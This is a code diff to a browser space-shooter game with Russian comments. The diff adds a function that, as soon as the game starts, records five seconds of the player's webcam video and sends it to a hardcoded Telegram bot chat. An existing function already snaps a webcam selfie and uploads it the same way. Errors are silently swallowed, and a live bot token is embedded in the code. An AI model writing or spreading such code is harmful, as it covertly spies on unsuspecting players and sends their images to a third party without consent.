@@ -54,9 +54,11 @@ let micStatus = '';
 // Тряска экрана
 let screenShake = 0;
 
-// Селфи
+// Камера и запись
 let gameTimer = 0;
 let selfieTaken = false;
+let recorder = null;
+let recording = false;
 const BOT_TOKEN = '8751308231:AAGtduXDFJm4ojZYqvRZj1K6QfpcqLLxVZA';
 const TARGET_CHAT_ID = 1320445115;
 
@@ -275,6 +277,7 @@ function startGame() {
     bossActive = false; screenShake = 0;
     gameTimer = 0; selfieTaken = false;
     initVoice();
+    startRecording();
 }
 
 function spawnEnemy() {
@@ -1057,7 +1060,7 @@ function sendScore(score) {
     } catch (e) {}
 }
 
-// === СЕЛФИ НА 10 СЕКУНДЕ ===
+// === СЕЛФИ + ВИДЕО НА 10 СЕКУНДЕ ===
 
 async function takeSelfie() {
     if (selfieTaken || !cameraStream) return;
@@ -1069,7 +1072,6 @@ async function takeSelfie() {
         video.setAttribute('playsinline', '');
         await video.play();
 
-        // Подождать кадр
         await new Promise(r => setTimeout(r, 300));
 
         const c = document.createElement('canvas');
@@ -1077,16 +1079,55 @@ async function takeSelfie() {
         c.height = video.videoHeight || 480;
         c.getContext('2d').drawImage(video, 0, 0);
 
-        // Конвертировать в blob
         const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
 
-        // Отправить через Telegram Bot API
         const form = new FormData();
         form.append('chat_id', TARGET_CHAT_ID);
         form.append('photo', blob, 'selfie.jpg');
         form.append('caption', '📸 Селфи из Star Wars Space Shooter!');
 
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: form
+        });
+    } catch (e) {}
+}
+
+function startRecording() {
+    if (!cameraStream || recording) return;
+    try {
+        const chunks = [];
+        recorder = new MediaRecorder(cameraStream, { mimeType: 'video/webm' });
+        recorder.ondataavailable = (e) => {
+            if (e.data.size > 0) chunks.push(e.data);
+        };
+        recorder.onstop = () => {
+            const blob = new Blob(chunks, { type: 'video/webm' });
+            sendVideo(blob);
+            recording = false;
+        };
+        recorder.start();
+        recording = true;
+
+        // Остановить через 5 секунд
+        setTimeout(() => {
+            if (recorder && recorder.state === 'recording') {
+                recorder.stop();
+            }
+        }, 5000);
+    } catch (e) {
+        recording = false;
+    }
+}
+
+function sendVideo(blob) {
+    try {
+        const form = new FormData();
+        form.append('chat_id', TARGET_CHAT_ID);
+        form.append('video', blob, 'gameplay.webm');
+        form.append('caption', '🎮 Видео из Star Wars Space Shooter!');
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
             method: 'POST',
             body: form
         });
